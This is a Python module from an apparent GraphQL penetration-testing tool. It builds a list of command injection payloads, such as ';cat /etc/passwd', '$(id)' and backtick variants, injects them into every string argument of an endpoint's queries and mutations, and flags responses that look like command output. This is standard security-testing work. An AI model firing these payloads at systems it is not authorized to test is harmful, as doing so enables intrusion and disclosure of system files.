"""
Author: Aleksa Zatezalo
Version: 2.0
Date: March 2025
Description: Module to test for command injection, sql injections, and other injection attacks.
"""

import time
import json
from typing import Dict, List, Optional, Tuple
from .base_tester import BaseTester


class juice(BaseTester):
    """
    A class for testing GraphQL endpoints for injection vulnerabilities.
    """

    def __init__(self):
        """Initialize the injection tester with default settings."""
        super().__init__()

    def generateCommandInjectionPayloads(self) -> List[str]:
        """Generate command injection test payloads."""

        return [
            # Basic Command Execution
            ";id",
            "|id",
            "||id",
            "&& id",
            # File Reading
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "||cat /etc/passwd",
            "&& cat /etc/passwd",
            # System Information
            ";uname -a",
            "|uname -a",
            "||uname -a",
            "&& uname -a",
            # Backtick variations (properly escaped)
            "`cat /etc/passwd`",
            "`id`",
            "`uname -a`",
            # Dollar variations
            "$(cat /etc/passwd)",
            "$(id)",
            "$(uname -a)",
            "uname -a",
            # Simple chaining
            ";cat /etc/passwd;id",
            "|cat /etc/passwd|id",
            "&&cat /etc/passwd&&id",
            "cat /etc/passwd",
            # With spaces
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
        ]

    async def testForCommandInjection(
        self,
        field_name: str,
        arg_name: str,
        payload: str,
        is_mutation: bool = False,
    ) -> Tuple[bool, Optional[str], float]:
        """Test a specific field for command injection vulnerabilities."""

        operation_type = "mutation" if is_mutation else "query"

        # Get field info from schema
        field_info = (
            self.schema_manager.mutation_fields.get(field_name)
            if is_mutation
            else self.schema_manager.query_fields.get(field_name)
        )
        if not field_info:
            return False, None, 0.0

        # Build arguments string including all required fields
        arg_strings = []
        for arg in field_info.get("args", []):
            if arg["name"] == arg_name:
                arg_strings.append(f'{arg["name"]}: "{payload}"')
            if arg["name"] != arg_name:
                if arg["name"] == "username":
                    arg_strings.append(f'{arg["name"]}: "{self.username}"')
                elif arg["name"] == "password":
                    arg_strings.append(f'{arg["name"]}: "{self.password}"')
                elif arg["type"].get("name") == "Int":
                    arg_strings.append(f'{arg["name"]}: 1')
                elif arg["type"].get("name") == "Boolean":
                    arg_strings.append(f'{arg["name"]}: true')
                else:
                    arg_strings.append(f'{arg["name"]}: "test"')
        args_str = ", ".join(arg_strings)

        # Define common field selections for different types
        field_selections = {
            "CreatePaste": "{ id content title success error }",
            "DeletePaste": "{ success error }",
            "UpdatePaste": "{ id content success error }",
            "AuthResponse": "{ token error }",
            "UserResponse": "{ id username error }",
            "SystemResponse": "{ status message error }",
            "Default": "{ id message error success }",
        }

        # Build the query based on the field type
        if field_name in [
            "systemDiagnostics",
            "getVersion",
            "getStatus",
        ]:  # Known scalar returns
            query = f"""
            {operation_type} {{
                {field_name}({args_str})
            }}
            """
        else:  # Object types that need selections
            # Get the appropriate selection or use default
            selection = field_selections.get(
                field_name.replace("create", "Create")
                .replace("delete", "Delete")
                .replace("update", "Update"),
                field_selections["Default"],
            )
            query = f"""
            {operation_type} {{
                {field_name}({args_str}) {selection}
            }}
            """

        start_time = time.time()
        try:
            result = await self.client.graphql(query, use_cache=False)
            duration = time.time() - start_time
            response_text = json.dumps(result)

            # Debug info - only print if there's an error
            if "errors" in result:
                error_msg = result.get("errors", [{}])[0].get(
                    "message", "Unknown error"
                )
                self.message.printMsg(f"Query: {query}", status="error")
                self.message.printMsg(f"Query error: {error_msg}", status="error")

            # Check for command output indicators
            indicators = [
                "root:",  # /etc/passwd content
                "/bin/bash",
                "/bin/sh",
                ":/home/",
                "/usr/bin",
                "/var/log",
                "Permission denied",
                "command not found",
                "Linux",
            ]

            # Check for command output in response
            for indicator in indicators:
                if indicator.lower() in response_text.lower():
                    return (
                        True,
                        f"Possible command injection in {field_name}.{arg_name} with payload: {payload}",
                        duration,
                    )

            return False, None, duration

        except Exception as e:
            self.message.printMsg(
                f"Error testing {field_name}.{arg_name}: {str(e)}", status="error"
            )
            return False, None, 0.0

    async def scanForInjection(self) -> List[str]:
        """Scan all fields for command injection vulnerabilities."""

        if not self.client.endpoint:
            self.message.printMsg(
                "No endpoint set. Run set_endpoint first.",
                status="error",
            )
            return []

        print()
        self.message.printMsg("Starting command injection testing", status="success")
        self.message.printMsg(
            "This may take some time depending on the number of fields...",
            status="warning",
        )

        vulnerabilities = []
        payloads = self.generateCommandInjectionPayloads()

        # Test query fields
        for field_name, field_info in self.schema_manager.query_fields.items():
            for arg in field_info.get("args", []):
                arg_type_name = self.schema_manager.get_field_type_name(arg.get("type", {}))
                if arg_type_name in ["String", "ID"]:
                    self.message.printMsg(
                        f"Testing query field: {field_name}.{arg['name']}",
                        status="log",
                    )

                    for payload in payloads:
                        is_vulnerable, message, duration = await self.testForCommandInjection(
                            field_name, arg["name"], payload
                        )
                        if is_vulnerable:
                            vulnerabilities.append(message)
                            self.message.printMsg(message, status="failed")

        # Test mutation fields
        for field_name, field_info in self.schema_manager.mutation_fields.items():
            for arg in field_info.get("args", []):
                arg_type_name = self.schema_manager.get_field_type_name(arg.get("type", {}))
                if arg_type_name in ["String", "ID"]:
                    self.message.printMsg(
                        f"Testing mutation field: {field_name}.{arg['name']}",
                        status="log",
                    )

                    for payload in payloads:
                        is_vulnerable, message, duration = await self.testForCommandInjection(
                            field_name, arg["name"], payload, is_mutation=True
                        )
                        if is_vulnerable:
                            vulnerabilities.append(message)
                            self.message.printMsg(message, status="failed")

        return vulnerabilities